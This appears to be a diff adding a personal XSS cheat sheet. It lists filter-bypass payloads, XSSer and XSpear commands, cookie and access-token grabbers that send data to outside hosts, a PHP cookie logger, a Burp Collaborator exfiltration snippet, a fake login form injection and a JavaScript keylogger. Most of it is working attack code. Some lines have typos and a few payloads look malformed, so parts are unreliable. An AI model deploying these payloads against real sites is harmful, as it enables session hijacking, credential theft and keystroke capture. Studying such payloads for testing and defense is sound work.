@@ -1,0 +1,118 @@
+---
+tags: [xss, examples, xxser]
+---
+
+# XSS
+
+# Tools
+ <iframe src=”http://10.11.0.220:3000”></iframe>
+<iframe width="700" scrolling="no" height="400" frameborder="0" src="http://10.11.0.220:3000" seamless="seamless">    <--invisible iframe
+
+## XSSer
+## XXSer is a python tool that automates the process of detecting and exploiting XSS vulnerabilities.
+## download and install from
+xsser --gtk  ***this will launch a ncie gui
+
+<script>alert('alertedon')</script>
+<script <script>>alert('alertedon')</script>
+<svg/onload=alert('alertedon')>
+<svg><script>alert('alertedon')
+<svg><script>alert&lpar;'alertedon'&rpar;
+<script>\u0061lert('alertedon')</script>
+<script>eval('\x61lert(\'alertedon\')')</script>
+[NL]eval('\x61lert(\'alertedon\')'
+[\u2028]eval('\x61lert(\'alertedon\')'
+<script>eval(8680439..toString(30))(983801..toString(36))</script>
+
+# XSPEAR
+# Usage: xspear -u [target] -[options] [value]
+
+xspear -u 'https://www.hahwul.com/?q=123' --cookie='role=admin' -v 1 -a 
+xspear -u 'http://testphp.vulnweb.com/listproducts.php?cat=123' -v 2
+xspear -u 'http://testphp.vulnweb.com/listproducts.php?cat=123' -v 0 -o json
+
+# Data grabber for XSS
+# Obtains the administrator cookie or sensitive access token, 
+# the following payload will send it to a controlled page.
+<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
+<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
+<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
+<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
+
+
+# Write the collected data into a file.
+php
+<?php
+$cookie = $_GET['c'];
+$fp = fopen('cookies.txt', 'a+');
+fwrite($fp, 'Cookie:' .$cookie."\r\n");
+fclose($fp);
+?>
+
+
+# CORS
+<script>
+  fetch('https://<SESSION>.burpcollaborator.net', {
+  method: 'POST',
+  mode: 'no-cors',
+  body: document.cookie
+  });
+</script>
+
+
+# UI redressing
+#Leverage the XSS to modify the HTML content of the page in order to display a fake login form.
+<script>
+history.replaceState(null, null, '../../../login');
+document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>"
+</script>
+
+# Identify an XSS endpoint
+# This payload opens the debugger in the developer console rather than triggering a popup alert box.
+javascript
+<script>debugger;</script>
+
+
+# Javascript Keylogger
+<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
+
+# Common Palyloads
+# Basic payload
+<script>alert('XSS')</script>
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+"><script>alert('XSS')</script>
+"><script>alert(String.fromCharCode(88,83,83))</script>
+<script>\u0061lert('22')</script>
+<script>eval('\x61lert(\'33\')')</script>
+<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
+<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">
+
+# Img payload
+<img src=x onerror=alert('XSS');>
+<img src=x onerror=alert('XSS')//
+<img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
+<img src=x:alert(alt) onerror=eval(src) alt=xss>
+"><img src=x onerror=alert('XSS');>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+
+# Svg payload
+<svgonload=alert(1)>
+<svg/onload=alert('XSS')>
+<svg onload=alert(1)//
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<svg id=alert(1) onload=eval(id)>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(/XSS/)
+<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
+<svg><script>alert('33')
+<svg><script>alert&lpar;'33'&rpar;
+
+# Div payload
+<div onpointerover="alert(45)">MOVE HERE</div>
+<div onpointerdown="alert(45)">MOVE HERE</div>
+<div onpointerenter="alert(45)">MOVE HERE</div>
+<div onpointerleave="alert(45)">MOVE HERE</div>
+<div onpointermove="alert(45)">MOVE HERE</div>
+<div onpointerout="alert(45)">MOVE HERE</div>
+<div onpointerup="alert(45)">MOVE HERE</div>
